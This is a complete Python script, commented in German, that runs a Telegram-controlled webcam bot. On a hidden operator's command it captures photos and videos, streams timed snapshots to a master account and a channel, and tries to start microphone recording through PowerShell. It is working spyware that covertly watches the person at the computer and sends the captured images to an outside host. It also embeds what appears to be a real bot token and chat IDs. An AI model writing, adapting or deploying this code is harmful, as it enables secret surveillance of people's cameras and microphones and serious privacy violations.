#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webcam_remote.py - Webcam Fernsteuerung über Telegram
Nur ein Telegram Bot Token
"""

import os
import sys
import cv2
import numpy as np
import telebot
from telebot import types
import threading
import time
from datetime import datetime
import subprocess
import tempfile
import platform

# ==================== KONFIGURATION ====================
BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"  # Spezieller Bot für Webcam
MASTER_ID = "6976176725"
CHANNEL_ID = "-1003734383961"

bot = telebot.TeleBot(BOT_TOKEN)
camera_active = False
camera_thread = None
current_camera = 0

# ==================== WEBCAM FUNCTIONS ====================
def list_available_cameras():
    """Listet verfügbare Kameras auf"""
    cameras = []
    for i in range(0, 10):  # Prüfe erste 10 Kameras
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cameras.append({
                'index': i,
                'resolution': f"{int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))}x{int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))}",
                'fps': cap.get(cv2.CAP_PROP_FPS)
            })
            cap.release()
    return cameras

def capture_photo(camera_index=0):
    """Macht ein Foto mit der Webcam"""
    try:
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            return None
        
        # Warte für besseres Bild
        time.sleep(0.5)
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            # Speichere temporär
            temp_file = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            cv2.imwrite(temp_file.name, frame)
            return temp_file.name
        
        return None
    except Exception as e:
        print(f"Capture error: {e}")
        return None

def capture_video(camera_index=0, duration=5):
    """Nimmt ein kurzes Video auf"""
    try:
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            return None
        
        fps = int(cap.get(cv2.CAP_PROP_FPS))
        if fps == 0:
            fps = 20
        
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # Temporäre Video-Datei
        temp_file = tempfile.NamedTemporaryFile(suffix='.avi', delete=False)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(temp_file.name, fourcc, fps, (width, height))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        
        cap.release()
        out.release()
        
        return temp_file.name
    except Exception as e:
        print(f"Video error: {e}")
        return None

def continuous_stream(camera_index=0, interval=10):
    """Kontinuierlicher Stream mit Intervall"""
    global camera_active
    
    while camera_active:
        try:
            photo_path = capture_photo(camera_index)
            if photo_path:
                # Sende an Master
                with open(photo_path, 'rb') as photo:
                    caption = f"📸 {datetime.now().strftime('%H:%M:%S')}"
                    bot.send_photo(MASTER_ID, photo, caption=caption)
                
                # Optional an Channel
                if CHANNEL_ID:
                    with open(photo_path, 'rb') as photo:
                        bot.send_photo(CHANNEL_ID, photo, 
                                      caption=f"Webcam {camera_index} - {datetime.now()}")
                
                os.remove(photo_path)
            
            time.sleep(interval)
        except Exception as e:
            print(f"Stream error: {e}")
            time.sleep(5)

def enable_microphone():
    """Aktiviert Mikrofon-Aufnahme"""
    try:
        if platform.system() == "Windows":
            # PowerShell: Mikrofon aktivieren
            ps_script = '''
            $microphone = Get-AudioDevice -Recording
            Set-AudioDevice -ID $microphone.ID
            Start-Process -FilePath "soundrecorder.exe"
            '''
            subprocess.run(['powershell', '-Command', ps_script], capture_output=True)
            return "✅ Mikrofon aktiviert"
    except:
        return "⚠️ Mikrofon nicht verfügbar"

# ==================== TELEGRAM COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if str(message.chat.id) != MASTER_ID:
        return
    
    # Verfügbare Kameras auflisten
    cameras = list_available_cameras()
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('📸 Foto machen')
    btn2 = types.KeyboardButton('🎥 Video (5s)')
    btn3 = types.KeyboardButton('🔴 Live Stream starten')
    btn4 = types.KeyboardButton('⏹️ Stream stoppen')
    btn5 = types.KeyboardButton('🎤 Mikrofon aktivieren')
    btn6 = types.KeyboardButton('📋 Kamera Liste')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    camera_info = ""
    if cameras:
        camera_info = "\nVerfügbare Kameras:\n"
        for cam in cameras:
            camera_info += f"• Kamera {cam['index']}: {cam['resolution']} @ {cam['fps']}fps\n"
    else:
        camera_info = "\n❌ Keine Kameras gefunden"
    
    bot.send_message(message.chat.id,
                    f"📹 **WEBCAM REMOTE BOT** 📹{camera_info}",
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    global camera_active, camera_thread, current_camera
    
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '📸 Foto machen':
        bot.send_message(message.chat.id, "📸 Mache Foto...")
        photo_path = capture_photo(current_camera)
        
        if photo_path:
            with open(photo_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, 
                              caption=f"📸 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            os.remove(photo_path)
        else:
            bot.send_message(message.chat.id, "❌ Konnte kein Foto machen")
    
    elif text == '🎥 Video (5s)':
        msg = bot.send_message(message.chat.id, "🎥 Nehme 5s Video auf...")
        video_path = capture_video(current_camera, 5)
        
        if video_path:
            with open(video_path, 'rb') as video:
                bot.send_video(message.chat.id, video,
                              caption=f"🎥 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            os.remove(video_path)
        else:
            bot.send_message(message.chat.id, "❌ Konnte kein Video aufnehmen")
    
    elif text == '🔴 Live Stream starten':
        if camera_active:
            bot.send_message(message.chat.id, "⚠️ Stream läuft bereits")
            return
        
        msg = bot.send_message(message.chat.id, 
                              "🔴 **LIVE STREAM STARTEN**\n"
                              "Gib Intervall in Sekunden (z.B. 10):",
                              parse_mode='Markdown')
        bot.register_next_step_handler(msg, start_stream)
    
    elif text == '⏹️ Stream stoppen':
        if camera_active:
            camera_active = False
            if camera_thread:
                camera_thread.join(timeout=5)
            bot.send_message(message.chat.id, "✅ Stream gestoppt")
        else:
            bot.send_message(message.chat.id, "⚠️ Kein aktiver Stream")
    
    elif text == '🎤 Mikrofon aktivieren':
        result = enable_microphone()
        bot.send_message(message.chat.id, result)
    
    elif text == '📋 Kamera Liste':
        cameras = list_available_cameras()
        if cameras:
            msg = "📹 **Verfügbare Kameras:**\n"
            for cam in cameras:
                msg += f"• **Kamera {cam['index']}**: {cam['resolution']} @ {cam['fps']}fps\n"
            
            msg += "\nWähle Kamera mit /camera [nummer]"
            bot.send_message(message.chat.id, msg, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "❌ Keine Kameras gefunden")

@bot.message_handler(commands=['camera'])
def select_camera(message):
    global current_camera
    try:
        cam_num = int(message.text.split()[1])
        cameras = list_available_cameras()
        cam_indices = [cam['index'] for cam in cameras]
        
        if cam_num in cam_indices:
            current_camera = cam_num
            bot.send_message(message.chat.id, f"✅ Kamera {cam_num} ausgewählt")
        else:
            bot.send_message(message.chat.id, f"❌ Kamera {cam_num} nicht verfügbar")
    except:
        bot.send_message(message.chat.id, "❌ Ungültige Kamera-Nummer")

def start_stream(message):
    global camera_active, camera_thread
    
    try:
        interval = int(message.text)
        if interval < 1 or interval > 60:
            interval = 10
    except:
        interval = 10
    
    camera_active = True
    camera_thread = threading.Thread(target=continuous_stream, 
                                    args=(current_camera, interval))
    camera_thread.start()
    
    bot.send_message(message.chat.id, 
                    f"🔴 **LIVE STREAM GESTARTET**\n"
                    f"Kamera: {current_camera}\n"
                    f"Intervall: {interval}s\n"
                    f"Zum Stoppen: '⏹️ Stream stoppen'",
                    parse_mode='Markdown')

# ==================== MAIN ====================
def main():
    print("😈 Webcam Remote Bot gestartet")
    
    # Prüfe OpenCV
    try:
        test_cap = cv2.VideoCapture(0)
        if test_cap.isOpened():
            print("✅ Webcam verfügbar")
            test_cap.release()
        else:
            print("⚠️ Keine Webcam gefunden")
    except:
        print("❌ OpenCV nicht korrekt installiert")
    
    try:
        bot.send_message(MASTER_ID, "✅ Webcam Remote Bot aktiv")
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Fehler: {e}")
        time.sleep(10)
        main()

if __name__ == "__main__":
    if BOT_TOKEN == "DEIN_WEBCAMBOT_TOKEN_HIER":
        print("❌ Token nicht gesetzt!")
        sys.exit(1)
    
    # Prüfe Abhängigkeiten
    try:
        import cv2
    except ImportError:
        print("❌ OpenCV nicht installiert!")
        print("Installiere mit: pip install opencv-python")
        sys.exit(1)
    
    main()
